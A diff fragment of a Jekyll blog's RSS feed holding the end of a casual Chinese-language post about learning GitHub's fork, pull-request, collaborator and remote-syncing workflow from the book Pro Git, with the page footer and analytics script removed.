+<li><p>最最开始，我以为git clone ［项目地址］，也就是把代码clone下来 然后修改，然后push到项目里就可以了。
+后来发现，这种情况只适合该项目属于你自己的情况，如果你git clone别人的项目代码，你想push都push不上去，因为 git push 不是需要你输入github帐号密码么。</p></li>
+<li><p>然后 我就知道了 github上 不是有个fork么， 好，那么给别人的项目提交代码的方式就有了，先fork下别人的代码，于是你的github上就出现了同名的项目，这个项目就属于你自己了，你把这个自己的项目git clone到本地，修修改改，然后push到你自己的项目里，那么你如何把你对自己项目的改动，给发到之前fork的那个原项目呢，看见了没，在github上你的项目页面有个按钮，叫Pull request，对 你点它就会把你的修改发到对方的项目里，人还会收到邮件呢，由原项目主人决定是否接受你的修改。
+但是，这样问题就出来了，在你fork他的项目之后，如果他又更新了代码，你自己fork的项目怎么做到和原项目同步呢？
+我就想啊，是不是 我还得重新git clone原项目的代码，然后手动合并到我fork的项目里呢。。。
+梁老师说，你丫这太蛋疼了，肯定不是这么麻烦，我细想，也是啊，这不2么。。。</p></li>
+<li><p>然后，从《Pro git》上看到一个知识点，我擦，github居然可以给项目添加合作者，也就是说，假如你，对，说你呢，戴眼镜那个，你想参与我的项目，你跟我说一声，我就把你添加到我的项目里作为合作者，这个选项在项目的设置里面有，只要我添加你了，你就可以git clone我的代码然后修修改改，然后直接push上来就行了，就不用fork那么麻烦了，如果你要更新服务器代码，只要git pull就行了，看 合作者这东西多方便，就像我们在公司用svn似的。</p></li>
+<li><p>然后我就想啊，有了合作者还需要你丫fork这个功能干啥？仔细一想，你写个好项目，不能随便加合作者啊，加了个熊孩子把你代码改废了可咋整，这年头熊孩子很多，我自己不就是一个么。所以fork肯定还是需要，fork就是专门预防熊孩子的，这就是真相！那么前面说道到fork之后如何与原项目同步的问题还在啊，没有得到解决。</p></li>
+<li><p>于是《Pro git》再次给了我一个解答，具体流程是你啊想给我的项目做贡献，你先git clone我的代码到本地，然后修修改改，然后你不是不能push到我的项目里么，你可以先在github页面上fork我的项目，有了你自己的项目地址（url）之后呢，你在本地操作git remote add [sort name] [your url]，意思就是添加第二个远程仓库地址，这个仓库的“昵称”就是你刚指定的[sort name]，然后，你之后push文件呢 就通过指定这个［sort name］来push到这个你自己的仓库里。等你觉得想要把你改的发给原项目同步，就在你的项目上点Pull request按钮.说下另一种情况，如果是，原项目发生了改动，你要想同步到本地，就直接从git fetch origin 从原项目的地址同步代码，然后再merge就好了。当然，如《Pro git》上所写，你可以通过新建分支的方式往自己的项目上push，这样同步的时候直接fetch就行了。这块如果我没写明白或者你想知道怎么新建分支的方式push到自己的项目里，可以直接参考《Pro git》的“公开的小型项目”一节，那我的贡献就是指点你如何从这本书里快速的找到你想要的。= =。</p></li>
+</ol>
+
+
+<p>好了，时间有限，我写的快不一定讲明白，欢迎跟我讨论。
+感谢linus，感谢git，感谢github，感谢kindle，感谢《Pro git》，感谢梁老师，感谢我自己，感谢所有的熊孩子们。</p>
 ]]></content:encoded>
     </item>
     
   </channel>
 </rss>
-
-</section>
-
-
-
-        </article>
-      </div>
-
-    <footer>
-        <p><small>Powered by <a href="https://github.com/mojombo/jekyll">Jekyll</a> & <a href="http://pages.github.com">GitHub</a> | Copyright 2008 - 2013 by <a href="http://ellochen.github.com/about/">Ello</a> | <span class="label label-info">2013-03-04 00:15:30 CST</span></small></p>
-    </footer>
-
-    </div>
-
-    <script type="text/javascript">
-      var _gaq = _gaq || [];
-      _gaq.push(['_setAccount', 'UA-12936429-2']);
-      _gaq.push(['_trackPageview']);
-      (function() {
-        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
-        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
-        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
-      })();
-    </script>
-  </body>
-</html>
